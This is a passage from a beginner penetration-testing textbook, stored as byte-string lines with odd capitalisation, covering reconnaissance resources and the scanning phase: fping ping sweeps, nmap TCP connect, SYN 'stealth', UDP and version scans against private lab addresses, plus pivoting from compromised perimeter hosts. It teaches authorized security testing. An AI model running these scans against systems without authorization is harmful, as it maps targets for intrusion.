because not all the iPs we collect will be \n', b'within that range. As a result, the final step in reconnaissance is to review the \n', b'iP list you just created and either contact the company to determine if you can \n', b'increase the scope of the pen test or remove the iP address from your list.\n', b'At this point you will be left with a list of iP addresses that you are authorized \n', b'to attack. do not discard or underestimate all the nonattackable information \n', b'you have gathered. in each of the remaining steps, we will be reviewing and \n', b'extracting information from step 1.\n', b'hOW DO I pRACTICE ThIS STEp?\n', b'now that you have a solid understanding of the basic tools and techniques \n', b'used to conduct reconnaissance, you will need to practice everything that was \n', b'covered. there are many ways to go about practicing this step. one simple and \n', b'effective idea is to make a list of companies by reading a newspaper. if you do \n', b'not have access to a newspaper, any popular news website will do, like www.\n', b'cnn.com, www.msnbc.com, etc.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'40\n', b'while making a list of potential targets to conduct reconnaissance on, try to \n', b'focus on company names that you have not heard of before. Any good news-\n', b'paper or website should contain dozens of companies that you are unfamil-\n', b'iar with. one note of caution here, YoU mUst Be sUre not to do AnY \n', b'ActiVe reconnAissAnce! obviously, you have not been authorized in any \n', b'way to perform the active techniques we covered in this chapter. However, you \n', b'can still practice gathering information through the passive techniques we dis-\n', b'cussed. this will allow you to refine and sharpen your skills. it will also pro-\n', b'vide you with an opportunity to develop a system for cataloging, organizing, \n', b'and reviewing the data you collect. remember, while this may be the \xe2\x80\x9cleast\xe2\x80\x9d \n', b'technical phase, it has the potential for the best returns.\n', b'WhERE DO I GO fROM hERE?\n', b'once you have practiced and mastered the basics of reconnaissance, you will \n', b'be armed with enough information and skill to tackle advanced topics in infor-\n', b'mation gathering. the following is a list of tools and techniques that will take \n', b'your information-gathering ability to the next level:\n', b'n search engine directives for sites other than google:\n', b'l now that your google-fu is strong, you need to master this technique \n', b'using other search engines. most modern search engines include direc-\n', b'tives or other ways to complete advanced searches. remember you should \n', b'never rely on a single search engine to do all of your reconnaissance. \n', b'searching for the same keywords in different search engines often returns \n', b'drastically different and surprisingly useful results.\n', b'n search engine Assessment tool (seAt)\n', b'l seAt is a great tool to use for quickly querying several different search \n', b'engines in a single pass. this tool automates much of the manual labor \n', b'required when performing reconnaissance across several different search \n', b'engines. seAt is built into Backtrack and available from its creator at \n', b'www.midnightresearch.com. their site even includes useful \xe2\x80\x9chow to\xe2\x80\x9d \n', b'videos for using seAt.\n', b'n Johnny long\xe2\x80\x99s google Hacking database (gHdB)\n', b'l this is a single repository for some of the most effective and feared \n', b'google Hacks in existence today! it has already been mentioned and \n', b'should go without saying but do not rUn tHese QUeries AgAinst \n', b'UnAUtHoriZed tArgets! You can find the gHdB at http://www.\n', b'hackersforcharity.org/ghdb. while you are there, take a minute to read \n', b'about Hackers for charity and Johnny\xe2\x80\x99s efforts with the \xe2\x80\x9cfood for work\xe2\x80\x9d \n', b'program.\n', b'n Google Hacking for Penetration Testers, 2nd edition, syngress\n', b'l Johnny\xe2\x80\x99s google Hacking book is a must-read for all penetration testers.\n', b'n Paterva\xe2\x80\x99s maltego ce\n', b'l maltego is a very powerful tool that aggregates information from pub-\n', b'lic databases and provides shockingly accurate details about your tar-\n', b'get organization. these details can be technical in nature, such as the \n', b'\x0cReconnaissance ChApTER 2\n', b'41\n', b'location or iP address of your firewall, or they can be personal, such as \n', b'the physical location of your currently (travelling) salesman. learning to \n', b'master maltego takes a little effort but is well worth your time. A free \n', b'version is available in Backtrack.\n', b'SUMMARy\n', b'information gathering is the first step in any penetration test or hack. even \n', b'though this phase is less technical than most, its importance should not be \n', b'overlooked. the more information you are able to collect, the better your \n', b'chances of success in later phases of the penetration test. At first, the amount of \n', b'information that can be gathered on your target can seem a bit overwhelming, \n', b'but with a good documentation process, the proper use of tools, and further \n', b'practice you will soon master the art of reconnaissance.\n', b'\x0cThis page intentionally left blank\n', b'Openmirrors.com\n', b'\x0c43\n', b'INTRODUCTION\n', b'once step 1 has been completed, you should have a solid understanding of \n', b'our target and a detailed collection of gathered information. this data mainly \n', b'includes our collection of iP addresses. recall that one of the final steps in \n', b'reconnaissance was to create a list of iP addresses that both belonged to the \n', b'target and that we were authorized to attack. this list is the key to transition-\n', b'ing from step 1 to step 2. in step 1, we mapped our gathered information to \n', b'Scanning\n', b'ChApTER 3\n', b'Information in This Chapter:\n', b'n Pings and Ping Sweeps\n', b'n Port Scanning\n', b'n Vulnerability Scanning\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'44\n', b'attackable iP addresses. in step 2, we will map iP addresses to open ports and \n', b'services.\n', b'it is important to understand that it is the job of most networks to allow at \n', b'least some communication to flow into and out of their borders. networks \n', b'that exist in complete isolation with no internet connection, no services like \n', b'e-mail or web traffic, are very rare today. each service, connection, or potential \n', b'connection to another network provides a potential foothold for an attacker. \n', b'scanning is the process of identifying live systems and the services that exist on \n', b'those systems.\n', b'step 2 begins by breaking the scanning process into three distinct phases:\n', b'2.1 determining if a system is alive\n', b'2.2 Port scanning the system\n', b'2.3 scanning the system for vulnerabilities\n', b'later in this chapter we will discuss tools that combine these phases into a sin-\n', b'gle process; however, for the purpose of introducing and learning new mate-\n', b'rial, it is best to cover them separately.\n', b'step 2.1 is the process of determining whether a target system is turned on and \n', b'capable of communicating or interacting with our machine. this step is the \n', b'least reliable and we should always continue with steps 2.2 and 2.3 regardless \n', b'of the outcome of this test. regardless, it is still important to conduct this step \n', b'and make note of any machines that respond as alive.\n', b'step 2.2 is the process of identifying the specific ports and services running a \n', b'particular host.\n', b'simply defined, ports provide a way or location for software and networks to \n', b'communicate with hardware like a computer. A port is a data connection that \n', b'allows a computer to exchange information with other computers, software, or \n', b'devices. Prior to the interconnection of computers and networks, information \n', b'was passed between machines through the use of physical media like floppy \n', b'drives. once computers were connected to a network, they needed an efficient \n', b'means for communicating with each other. Ports were the answer. the use of \n', b'multiple ports allows for simultaneous communication without the need  \n', b'to wait.\n', b'to further clarify this point for those of you who are unfamiliar with ports and \n', b'computers, it may be helpful to consider the following analogy: think of your \n', b'computer as a house. there are many different ways that a person can enter the \n', b'house. each of the different ways to enter your house (computer) is like a com-\n', b'puter port. Just like a port on a computer, all the entryways allow traffic to flow \n', b'into and out of your home.\n', b'imagine a house with unique numbers over each of the potential entry points. \n', b'most people will use the front door. However, the owners may come in \n', b'through the garage door. sometimes, people enter the house from a backdoor \n', b'\x0cScanning ChApTER 3\n', b'45\n', b'Table 3.1  Common Port Numbers and Their Corresponding Service\n', b'Port Number\n', b'Service\n', b'20\n', b'FTP data transfer\n', b'21\n', b'FTP control\n', b'22\n', b'SSH\n', b'23\n', b'Telnet\n', b'25\n', b'SMTP (e-mail)\n', b'53\n', b'DNS\n', b'80\n', b'HTTP\n', b'443\n', b'HTTPS\n', b'or sliding glass door off the deck. An unconventional person may climb \n', b'through a window or attempt to squeeze through the doggie door!\n', b'regardless of how you get into your house, each of these examples corresponds \n', b'nicely with the analogy of computers and ports. recall that ports are like gate-\n', b'ways to your computer. some ports are more common and receive lots of traf-\n', b'fic (just like your front door); others are more obscure and rarely used (by \n', b'humans) like the doggie door.\n', b'many common network services run on standard port numbers and can give \n', b'attackers an indication as to the function of the target system. table 3.1 pro-\n', b'vides a list of common ports and their corresponding services.\n', b'obviously, there are many more ports and services. However, this list serves as \n', b'a basic introduction to common ports that are utilized by organizations today. \n', b'You will see these services repeatedly as you begin to port scan your targets.\n', b'we need to pay special attention to the discovery of any open ports on our \n', b'target systems. You should make detailed notes and save the output of any tool \n', b'run in step 2.2. remember every open port is a potential gateway into the tar-\n', b'get system.\n', b'the final step in scanning is step 2.3, vulnerability scanning. Vulnerability \n', b'scanning is the process of locating and identifying known weaknesses in the \n', b'services and software running on a target machine. the discovery of known \n', b'vulnerabilities on a target system can be like finding the pot of gold at the end \n', b'of a rainbow. many systems today can be exploited directly with little or no \n', b'skill when a machine is discovered to have a known vulnerability.\n', b'it is important to mention that there is a difference in the severity of various \n', b'vulnerabilities. some vulnerabilities may present little opportunities for an \n', b'attacker, whereas others will allow you to completely take over and control a \n', b'machine with a single click of a button. we will discuss the various levels of \n', b'vulnerabilities in more detail later in the chapter.\n', b'in the past, i have had several clients ask me to attempt to gain access to some \n', b'sensitive server on an internal network. obviously in these cases, the final \n', b'Table 3.1\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'46\n', b'target is not directly accessible via the internet. whether we are going after \n', b'some supersecret internal machine or simply attempting to gain access to a \n', b'network, we usually begin by scanning the perimeter devices. the reason for \n', b'this is simple, we start at the perimeter because most of the information we \n', b'have from step 1 belongs to perimeter devices. Also, with many of today\xe2\x80\x99s tech-\n', b'nologies and architectures, it is not always possible to reach directly into a net-\n', b'work. As a result, we often employ a hacking methodology where we chain a \n', b'series of machines together in order to reach our final target. first we conquer a \n', b'perimeter device, then we move to an internal machine.\n', b'Perimeter devices are computers, servers, routers, firewalls, or other equipment, \n', b'which sit at the outer edge of a protected network. these devices serve as an \n', b'intermediary between protected internal resources and external networks like \n', b'the internet.\n', b'As previously mentioned, we often begin by scanning the perimeter devices \n', b'to look for weaknesses or vulnerabilities that will allow us to gain entry into \n', b'the network. once we have successfully gained access (which we will discuss \n', b'in chapter 4), the scanning process can be repeated from the newly owned \n', b'machine, in order to find additional targets. this cyclical process allows us to \n', b'create a very detailed internal network map and discover the critical infrastruc-\n', b'ture hiding behind the corporate firewall.\n', b'pINGS AND pING SWEEpS\n', b'A ping is a special type of network packet called an icmP packet. Pings work \n', b'by sending specific types of network traffic, called icmP echo request pack-\n', b'ets, to a specific interface on a computer or network device. if the device (and \n', b'the attached network card) that received the ping packet is turned on and not \n', b'restricted from responding, the receiving machine will respond back to the \n', b'originating machine with an echo reply packet. Aside from telling us that \n', b'a host is alive and accepting traffic, pings provide other valuable information \n', b'including the total time it took for the packet to travel to the target and return. \n', b'Pings also report traffic loss that can be used to gauge the reliability of a net-\n', b'work connection. figure 3.1 shows an example of the ping command.\n', b'the first line in figure 3.1 shows the ping command being issued. Please note, \n', b'this particular screenshot was taken from a windows machine. All modern ver-\n', b'sions of linux and windows include the ping command. the major difference \n', b'between the linux and windows version is that by default the windows ping \n', b'command will send four echo request packets and automatically terminate, \n', b'whereas the linux ping command will continue to send echo request com-\n', b'mands until you force it to stop. on a linux system, you can force a ping com-\n', b'mand to stop sending packets by using the cntl\xee\x80\xb1c combination.\n', b'let us focus our attention on the third line that starts with \xe2\x80\x9creply from.\xe2\x80\x9d this \n', b'line is telling us that our icmP echo request packet successfully reached the iP \n', b'address of 64.233.167.99 and that the iP address sent a reply packet back to \n', b'Openmirrors.com\n', b'\x0cScanning ChApTER 3\n', b'47\n', b'our machine. the \xe2\x80\x9cbytes\xee\x80\xb532\xe2\x80\x9d in the line indicate the size of the packet being \n', b'sent. the \xe2\x80\x9ctime\xee\x80\xb526 ms\xe2\x80\x9d is telling you how long the entire round trip took for \n', b'the packets to travel to and from the target. the \xe2\x80\x9cttl\xee\x80\xb5240\xe2\x80\x9d is a time to live \n', b'value; this is used to determine the maximum number of hops the packet will \n', b'take before automatically expiring.\n', b'now that you have a basic understanding of how the ping command works, let \n', b'us see how we leverage this tool as a hacker. Because we know that pings can \n', b'be useful in determining if a host is alive, we can use the ping tool as a host \n', b'discovery service. Unfortunately, pinging every potential machine on even a \n', b'small network would be highly inefficient. fortunately for us, there are several \n', b'tools that allow us to conduct ping sweeps. A ping sweep is a series of pings \n', b'that are automatically sent to a range of iP addresses, rather than manually \n', b'entering the individual target\xe2\x80\x99s address.\n', b'the simplest way to run a ping sweep is with a tool called fPing. fPing is built \n', b'into Backtrack and is run from the terminal. the tool can also be downloaded \n', b'for windows. the easiest way to run fPing is to open terminal window and \n', b'type the following: fping \xe2\x80\x93a \xe2\x80\x93g 172.16.45.1 172.16.45.254>hosts.txt. \n', b'the \xe2\x80\x9c\xe2\x80\x93a\xe2\x80\x9d switch is used to show only the live hosts in our output. this makes \n', b'our final report much cleaner and easier to read. the \xe2\x80\x9c\xe2\x80\x93g\xe2\x80\x9d is used to specify \n', b'the range of iP addresses we want to sweep. You need to enter both the begin-\n', b'ning and the ending iP addresses. in this example, we scanned all the iPs from \n', b'172.16.45.1 to 172.16.45.254. the \xe2\x80\x9c>\xe2\x80\x9d character is used to pipe the output to \n', b'a file, and the hosts.txt is used to specify the name of the file our results will be \n', b'saved to. there are many other switches that can be used to change the func-\n', b'tionality of the fPing command. You can view them all by entering the follow-\n', b'ing command in a terminal window:\n', b'man fping\n', b'fIGURE 3.1\n', b'An Example of the Ping Command.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'48\n', b'once you have run the command above, you can open the hosts.txt file that \n', b'was created to find a list of target machines that responded to our pings. these \n', b'iP addresses should be added to your target list for later investigation. it is \n', b'important to remember that not every host will respond to ping requests; some \n', b'hosts may be firewalled or otherwise blocking ping packets.\n', b'pORT SCANNING\n', b'now that you have a list of targets, we can continue our examination by scan-\n', b'ning the ports on each of the iP addresses we found. recall that the goal of port \n', b'scanning is to identify which ports are open and determine what services are \n', b'available on our target system. A service is a specific job or task that the com-\n', b'puter performs like e-mail, ftP, printing, or providing web pages. Port scanning \n', b'is like knocking on the various doors and windows of a house and seeing who \n', b'answers. for example if we find that port 80 is open, we can attempt a connec-\n', b'tion to the port and oftentimes get specific information about the web server \n', b'that is listening on that port.\n', b'there are a total of 65,536 (0\xe2\x80\x9365,535) ports on every computer. Ports can be \n', b'either tcP or UdP depending on the service utilizing the port or nature of the \n', b'communication occurring on the port. we scan computers to see what ports \n', b'are in use or open. this gives us a better picture of the purpose of the machine, \n', b'which, in turn, gives us a better idea about how to attack the box.\n', b'if you had to choose only one tool to conduct port scanning, you would \n', b'undoubtedly choose nmap. nmap was written by gordon \xe2\x80\x9cfyodor\xe2\x80\x9d lyon and \n', b'is available for free from www.insecure.org and is built into many of today\xe2\x80\x99s \n', b'linux distributions including Backtrack. Although it is possible to run nmap \n', b'from a graphical user interface (gUi), we are going to focus on using the termi-\n', b'nal to run our port scans.\n', b'People who are new to security and hacking often ask why they should learn \n', b'to use the command line or terminal version of a tool rather than relying on a \n', b'gUi. these same people often complain that using the terminal is not as easy. \n', b'the response is very simple. first, using the command line version of a tool will \n', b'allow you to learn the switches and options that change the behavior of your \n', b'tool. this gives you more flexibility, more granular control, and a better under-\n', b'standing of the tool you are running. second (and maybe more importantly), \n', b'rarely does hacking work like it is portrayed in the movies. finally, the com-\n', b'mand line can be scripted. scripting and automation become key when you \n', b'want to advance your skillset to the next level.\n', b'remember the movie Swordfish where Hugh Jackman is creating a virus? He is \n', b'dancing and drinking wine, and apparently building a virus in a very graphical, \n', b'gUi-driven way. the point is that this is just not realistic. most people who are \n', b'new to hacking assume that hacking is a very gUi-oriented task: that once you \n', b'take over a machine you are presented with a desktop and control of the mouse \n', b'and screen. Although this scenario is possible, it is rarely the case. in most jobs, \n', b'\x0cScanning ChApTER 3\n', b'49\n', b'your main goal will be to get an administrative shell or backdoor access to the \n', b'machine. this shell is literally a terminal that allows you to control the target Pc \n', b'from the command line. it looks and feels just like the terminals that we have \n', b'been working with, except a remote shell allows you to enter the commands \n', b'on your computer terminal and have them executed on the target machine. so \n', b'learning the command line version of your tools is critical because once you \n', b'have control of a machine you will need to upload your tools and interact with \n', b'the target through a command prompt, not through a gUi.\n', b'let us assume you still refuse to learn the command line. let us also assume \n', b'that with the use of several tools you were able to gain access to a target system. \n', b'when you gain access to that system, you will not be presented with a gUi but \n', b'rather with a command prompt. if you do not know how to copy files, add \n', b'users, modify documents, and make other changes through the command line, \n', b'your work of owning the target will have been in vain. You will be stuck, like \n', b'moses who was able to see the promised land but not allowed to enter!\n', b'when we conduct a port scan, our tool will literally create a packet and send \n', b'it to each designated port on the machine. the goal is to determine what kind \n', b'of a response we get from the target port. different types of port scans can pro-\n', b'duce different results. it is important to understand the type of scan you are \n', b'running as well as the expected output of that scan.\n', b'The Three-Way handshake\n', b'when two machines on any given network want to communicate using tcP, \n', b'they do so by completing the three-way handshake. this process is very similar \n', b'to a phone conversation (at least before everyone had caller id!). when you \n', b'want to talk to someone on the phone, you pick up the phone and dial the \n', b'number, the receiver picks up the ringing phone not knowing who the caller \n', b'is and says \xe2\x80\x9cHello?,\xe2\x80\x9d the original caller then introduces himself by saying \xe2\x80\x9cHi, \n', b'this is John!\xe2\x80\x9d in response to this, the original receiver will often acknowledge \n', b'the caller by saying \xe2\x80\x9coh, hi John!\xe2\x80\x9d At this point both people have enough \n', b'information for the conversation to continue as normal.\n', b'computers work much the same way. when two computers want to talk, they \n', b'go through a similar process. the first computer connects to the second com-\n', b'puter by sending a sYn packet to a specified port number. if the second com-\n', b'puter is listening, it will respond with a sYn/Ack. when the first computer \n', b'receives the sYn/Ack, it replies with an Ack packet. At this point, the two \n', b'machines can communicate normally. in our phone example above, the origi-\n', b'nal dialer is like sending the sYn packet. the receiver picking up the phone \n', b'and saying \xe2\x80\x9cHello?\xe2\x80\x9d is like the sYn/Ack packet and the original caller intro-\n', b'ducing himself is like the Ack packet.\n', b'Using Nmap to perform a TCp Connect Scan\n', b'the first scan we will look at is called the tcP connect scan. this scan is often \n', b'considered the most basic and stable of all the port scans because nmap \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'50\n', b'attempts to complete the three-way handshake on each port specified in the \n', b'nmap command. Because this scan actually completes the three-way hand-\n', b'shake and then tears down the connection gracefully, there is little chance that \n', b'you will flood the target system and cause it to crash.\n', b'if you do not specify a specific port range nmap will scan the 1,000 most com-\n', b'mon ports. Unless you are in a great hurry, it is always recommended specify-\n', b'ing all ports. the reason is that oftentimes crafty administrators will attempt \n', b'to obscure a service by running it on a nonstandard port. You can scan all the \n', b'ports by specifying \xe2\x80\x9c-p-\xe2\x80\x9d when running nmap. Using the \xe2\x80\x9c\xe2\x80\x93PN\xe2\x80\x9d switch with \n', b'every nmap scan is recommended. Utilizing the \xe2\x80\x9c\xe2\x80\x93PN\xe2\x80\x9d switch will cause nmap \n', b'to disable host discovery and force the tool to scan every system as if it were \n', b'alive. this is extremely useful for discovering additional systems and ports that \n', b'otherwise may be missed.\n', b'to run a tcP connect, we issue the following command from a terminal:\n', b'nmap \xe2\x80\x93sT -p- -PN 172.16.45.135\n', b'take a moment to review this command. the first word \xe2\x80\x9cnmap\xe2\x80\x9d causes the \n', b'nmap port scanner to start. the second command \xe2\x80\x9c\xe2\x80\x93sT\xe2\x80\x9d tells nmap to run \n', b'a tcP connect scan. specifically, to break this switch down even further, the \n', b'\xe2\x80\x9c-s\xe2\x80\x9d is used to tell nmap what kind of scan we want to run. the \xe2\x80\x9c-T\xe2\x80\x9d in the \n', b'\xe2\x80\x9c-sT\xe2\x80\x9d is used to run a scan type of tcP connect. we use the \xe2\x80\x9c-p-\xe2\x80\x9d to tell \n', b'nmap to scan all the ports not just the default 1,000. we use the \xe2\x80\x9c\xe2\x80\x93PN\xe2\x80\x9d switch \n', b'to skip the host discovery phase and scan all the addresses as if the system were \n', b'alive and responding to ping requests. finally, we specify the target iP address; \n', b'obviously, your target\xe2\x80\x99s iP address will be different from the one shown in the \n', b'screenshot! figure 3.2 shows the tcP connect nmap scan and the output that \n', b'was received when run against the target.\n', b'oftentimes, we need to run our scans against an entire subnet, or range of iP \n', b'addresses. when this is the case, we can instruct nmap to scan a continuous \n', b'range of iPs by simply appending the last octet of the ending iP address onto \n', b'the scan like so:\n', b'nmap \xe2\x80\x93sT -p- -PN 172.16.45.1-254\n', b'fIGURE 3.2\n', b'TCP Connect Scan and Results.\n', b'\x0cScanning ChApTER 3\n', b'51\n', b'issuing this command will cause nmap to port scan all the hosts between the \n', b'iP addresses 172.16.45.1 and 172.16.45.254. Just like ping sweeps, this is a \n', b'very powerful technique that can greatly improve the productivity of your scan-\n', b'ning life!\n', b'if you need to scan a series of hosts that are not in sequential order, you can \n', b'create a text file and list each host iP address on a single line. then add the \n', b'\xe2\x80\x9c\xe2\x80\x93iL path_to_the_text_file\xe2\x80\x9d switch to your nmap command. doing this \n', b'allows you to scan all of your target hosts from a single command. whenever \n', b'possible, always try to create a single text file containing all of your target iPs. \n', b'most of the tools we discuss have a switch or mechanism for loading this text \n', b'file, which saves the effort or retyping, but more importantly, reduces the num-\n', b'ber of times you will type each iP address and therefore reduces the chance \n', b'that you will fat-finger the iP address and scan the wrong target.\n', b'Using Nmap to perform a SyN Scan\n', b'the sYn scan is arguably the most popular nmap port scan. there are many \n', b'reasons for its popularity, including the fact that it happens to be the default \n', b'nmap scan. if you run the nmap command without specifying a scan type \n', b'(using the \xe2\x80\x93s switch), nmap will use the sYn scan by default.\n', b'Aside from the fact that the sYn scan is the default choice, it is also popular \n', b'because it is faster than the tcP connect scan and yet remains quite safe, with \n', b'little chance of dos\xe2\x80\x99ing or crashing the target system. sYn scans are faster \n', b'because rather than completing the entire three-way handshake, it only com-\n', b'pletes the first two steps.\n', b'in a sYn scan, the scanning machine sends a sYn packet to the target and the \n', b'target responds with a sYn/Ack (assuming the port is in use and not filtered) \n', b'just like it did when we ran a tcP connect scan. However, at this point, rather \n', b'than sending the traditional Ack packet, the scanning machine sends an rst \n', b'(reset) packet to the target. the reset packet tells the target machine to disre-\n', b'gard any previous packets and close the connection between the two machines. \n', b'it should be clear that the speed advantage of the sYn scan over the tcP \n', b'connect scan comes from the fact that there are less packets sent between the \n', b'hosts when using a sYn scan rather than a tcP connect scan. Although a few \n', b'packets may not sound like a big advantage, it can add up quickly when scan-\n', b'ning multiple hosts.\n', b'if we consider the example of comparing the three-way handshake to a phone \n', b'call, sYn scans would be like calling someone up, having the receiver pick up \n', b'the phone and saying \xe2\x80\x9cHello?\xe2\x80\x9d, and then simply hanging up on the person \n', b'without a single word.\n', b'Another advantage to the sYn scan is that in some instances, it provides a level \n', b'of obscurity or stealth. Because of this feature, the sYn scan is often referred \n', b'to as the \xe2\x80\x9cstealth scan.\xe2\x80\x9d the stealth portion of this scan comes from the fact \n', b'that because the three-way handshake is never fully completed, the official \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'52\n', b'connection was never 100 percent established. there are applications and log \n', b'files that require the completion of the three-way handshake before they begin \n', b'recording activity. As a result, if a log file only records completed connections \n', b'and the sYn scan never officially completes a single connection, this scan may \n', b'be undetected by some applications. Please note, this is the exception and not \n', b'the rule. All modern firewalls and intrusion detection systems in use today will \n', b'detect and report a sYn scan!\n', b'Because the sYn scan is the default nmap scan, we do not technically need  \n', b'to specify the scan type with the \xe2\x80\x9c\xe2\x80\x93s\xe2\x80\x9d switch. However, because this book \n', b'focuses on the basics, it is worth the effort to get into the habit of specifying \n', b'your scan type.\n', b'to run a sYn scan, you can open a terminal window and issue the following \n', b'command:\n', b'nmap \xe2\x80\x93sS -p- -PN 172.16.45.135\n', b'this command is exactly the same as the previous example with one excep-\n', b'tion\xe2\x80\x94rather than using an \xe2\x80\x9c\xe2\x80\x93st\xe2\x80\x9d we used an \xe2\x80\x9c\xe2\x80\x93ss.\xe2\x80\x9d this instructs nmap to run \n', b'a sYn scan rather than a tcP connect scan. the scan types are easy to remem-\n', b'ber because a tcP connect scan begins with the letter \xe2\x80\x9ct,\xe2\x80\x9d whereas the sYn \n', b'scan begins with the letter \xe2\x80\x9cs.\xe2\x80\x9d each of the other switches was explained in the \n', b'section above. Please review the \xe2\x80\x9cUsing nmap to complete a tcP connect \n', b'scan\xe2\x80\x9d for a detailed breakdown of the switches in this command. figure 3.3 \n', b'shows the output of a sYn scan against our target.\n', b'take a moment to compare the total run time between the two scans in figures \n', b'3.2 and 3.3. even in our simple environment against a single host, the sYn \n', b'scan completed its execution faster.\n', b'Using Nmap to perform UDp Scans\n', b'one of the most common port scanning mistakes of new penetration testers is \n', b'that they overlook UdP. these aspiring hackers oftentimes fire up nmap, run a \n', b'single scan (typically a sYn scan), and move onto vulnerability scanning. do \n', b'not neglect to scan UdP ports! failing to scan your target for open UdP ports \n', b'fIGURE 3.3\n', b'SYN Scan and Results.\n', b'\x0cScanning ChApTER 3\n', b'53\n', b'is like reading the cliff notes version of a book. You will probably have a solid \n', b'understanding of the story, but you arre likely to miss many of the details.\n', b'it is important to understand that both tcP connect scans and sYn scans use \n', b'tcP as the basis for their communication. tcP is an acronym for transmission \n', b'control Protocol. UdP is an acronym for User datagram Protocol. computers \n', b'can communicate with one another using either tcP or UdP; however, there \n', b'are several key differences between the two protocols.\n', b'tcP is considered a \xe2\x80\x9cconnection oriented protocol\xe2\x80\x9d because it requires that the \n', b'communication between both the sender and the receiver stays in sync. this \n', b'process ensures that the packets sent from one computer to another arrive at \n', b'the receiver intact and in the order they were sent. on the other hand, UdP \n', b'is said to be \xe2\x80\x9cconnectionless\xe2\x80\x9d because the sender simply sends packets to the \n', b'receiver with no mechanism for ensuring that the packets arrive at the desti-\n', b'nation. there are many advantages and disadvantages to each of the protocols \n', b'including speed, reliability, and error checking. to truly master port scanning, \n', b'you will need to have a solid understanding of these protocols. take some time \n', b'and learn about each of them.\n', b'recall that earlier the three-way handshake process was described by compar-\n', b'ing the process to a phone call. the three-way handshake is a key component \n', b'of tcP communication that allows the sender and the receiver to stay in sync. \n', b'Because UdP is connectionless, this type of communication is most often com-\n', b'pared to dropping a letter in a mailbox. in most cases, the sender simply writes \n', b'an address on an envelope, puts a stamp on the letter, and puts the letter in the \n', b'mailbox. eventually, the mailman comes along and picks up the letter where \n', b'it is entered into the mail routing system. in this example, there is no return \n', b'receipt or delivery confirmation for the sender. once the mailman takes the let-\n', b'ter, the sender has no guarantee that the letter will get to its final destination.\n', b'now that you have a very simple understanding of the difference between \n', b'tcP and UdP, it is important to remember that not every service utilizes tcP. \n', b'several prominent services make use of UPd including dHcP, dns (for indi-\n', b'vidual lookups), snmP, and tftP. one of the most important traits for a pen-\n', b'etration tester to have is thoroughness. it will be quite embarrassing to you if \n', b'you overlook or miss a service because you forgot to run a UdP scan against \n', b'your target.\n', b'Both the tcP connect scan and the sYn scan use tcP as the basis for their \n', b'scanning techniques. if we want to discover services utilizing UdP, we need to \n', b'instruct nmap to create scans using UdP packets. fortunately, nmap makes \n', b'this process very simple. to run a UdP scan against our target, we would enter \n', b'the following command in a terminal:\n', b'nmap \xe2\x80\x93sU 172.16.45.129\n', b'notice the difference between this command and the others we have learned. \n', b'first, we specify the nmap UdP scan by using the \xe2\x80\x9c\xe2\x80\x93sU\xe2\x80\x9d command. Astute \n', b'readers will also notice that the \xe2\x80\x9c-p-\xe2\x80\x9c and the \xe2\x80\x9c\xe2\x80\x93Pn\xe2\x80\x9d switches have been \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'54\n', b'dropped from the scan. the reason for this is simple. UdP scans are very slow; \n', b'running even a basic UdP scan on the default 1,000 ports can take 20\xe2\x80\x9330 min-\n', b'utes. You may also notice that the iP address has changed. in this example, we \n', b'are scanning a linux machine with the tftP service running. this will allow us \n', b'to see the UPd scan with results. figure 3.4 shows the output of the scan.\n', b'it is important to remember that UdP communication does not require a \n', b'response from the receiver. if the target machine does not send back a reply \n', b'saying a packet was received, how can nmap differentiate between an open \n', b'port and a filtered (firewalled) port? in other words, if a service is available \n', b'and accepting UdP packets, the normal behavior for this service is to simply \n', b'accept the packet but not send a message back to the receiver saying \xe2\x80\x9cgot it!\xe2\x80\x9d \n', b'likewise, a common firewall strategy is to simply absorb the packet and not \n', b'send a response packet back to the sender. in this example, even though one \n', b'packet went through and one packet was blocked, because no packets were \n', b'returned to the sender, there is no way of knowing if the packet was accepted \n', b'by a service or dropped by the firewall.\n', b'this conundrum makes it very difficult for nmap to determine if a UdP port \n', b'is open or filtered. As a result when nmap does not receive a response from a \n', b'UdP scan, it returns the following message for the port \xe2\x80\x9copen | filtered.\xe2\x80\x9d it is \n', b'important to note that on rare occasions a UdP service will send a response \n', b'back to the original source. in these cases, nmap is smart enough to under-\n', b'stand that there is clearly a service listening and responding to requests and \n', b'will mark those ports as \xe2\x80\x9copen.\xe2\x80\x9d\n', b'As was discussed earlier, oftentimes people who are new to port scanning over-\n', b'look UdP scans. this is probably due in part to the fact that most ordinary \n', b'UdP port scans provide very little information and mark nearly every port as \n', b'\xe2\x80\x9copen | filtered.\xe2\x80\x9d After seeing the same output on several different hosts, it is \n', b'easy to become disillusioned with UdP scans. However, all is not lost! the fine \n', b'folks who wrote nmap provide us with a way to draw more accurate results \n', b'from our UdP scans.\n', b'fIGURE 3.4\n', b'UPD Scan Command and Result.\n', b'Openmirrors.com\n', b'\x0cScanning ChApTER 3\n', b'55\n', b'to elicit a more useful response from our target, we can add the \xe2\x80\x9c\xe2\x80\x93sV\xe2\x80\x9d switch \n', b'to our UdP scan. the \xe2\x80\x9c\xe2\x80\x93sV\xe2\x80\x9d switch is used for version scanning but, in this \n', b'case, can also help us narrow the results of our UPd scan.\n', b'when version scanning is enabled, nmap sends additional probes to every \n', b'\xe2\x80\x9copen | filtered\xe2\x80\x9d port that is reported by the scan. these additional probes \n', b'attempt to identify services by sending specifically crafted packets. these spe-\n', b'cially crafted packets are often much more successful in provoking a response \n', b'from the target. oftentimes, this will change the reported results from \xe2\x80\x9copen | \n', b'filtered\xe2\x80\x9d to \xe2\x80\x9copen.\xe2\x80\x9d\n', b'As mentioned above, the simplest way to add version scanning to a UdP probe \n', b'is to include the \xe2\x80\x9c\xe2\x80\x93sV\xe2\x80\x9d switch. Please note that because we are already using \n', b'the \xe2\x80\x9c\xe2\x80\x93sU\xe2\x80\x9d switch to specify the type of scan, we can simply append the capital \n', b'V onto the back of the \xe2\x80\x9c\xe2\x80\x93sU.\xe2\x80\x9d As a result, our new command becomes:\n', b'nmap \xe2\x80\x93sUV 172.16.45.135\n', b'Using Nmap to perform an Xmas Scan\n', b'in the computer world, an rfc is a document that contains either notes or \n', b'the technical specifications covering a given technology or standard. rfcs can \n', b'provide us with a tremendous amount of detail about the inner workings of a \n', b'particular system. Because rfcs describe the technical details of how a system \n', b'should work, attackers and hackers will often review 